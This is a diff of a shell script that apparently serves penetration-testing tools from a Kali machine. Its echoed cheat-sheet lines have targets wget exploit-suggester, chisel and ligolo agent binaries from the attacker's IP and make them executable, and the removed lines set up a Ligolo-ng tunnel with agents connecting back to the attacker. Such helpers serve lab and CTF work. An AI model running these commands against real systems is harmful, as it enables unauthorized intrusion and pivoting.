@@ -322,13 +322,8 @@ echo "  wget http://$IP:$PORT/linux-exploit-suggester.sh && chmod +x linux-explo
 echo "  wget http://$IP:$PORT/chisel_linux && chmod +x chisel_linux"
 echo "  wget http://$IP:$PORT/ligolo_agent_linux && chmod +x ligolo_agent_linux"
 echo ""
-echo "── Ligolo-ng (proxy KALİDE KALIR, agent hedefe gider) ──"
-echo "  # Kali (root ŞART - tun interface açar):"
-echo "  sudo ip tuntap add user \$USER mode tun ligolo"
-echo "  sudo ip link set ligolo up"
+echo "── Ligolo-ng (Kali) ───────────────────────────"
 echo "  sudo ./ligolo_proxy -selfcert"
-echo "  # Hedef (Windows): .\\ligolo_agent.exe -connect $IP:11601 -ignore-cert"
-echo "  # Hedef (Linux):   ./ligolo_agent_linux -connect $IP:11601 -ignore-cert"
 echo ""
 cd "$(dirname "$0")" && python3 -m http.server $PORT
 SERVE
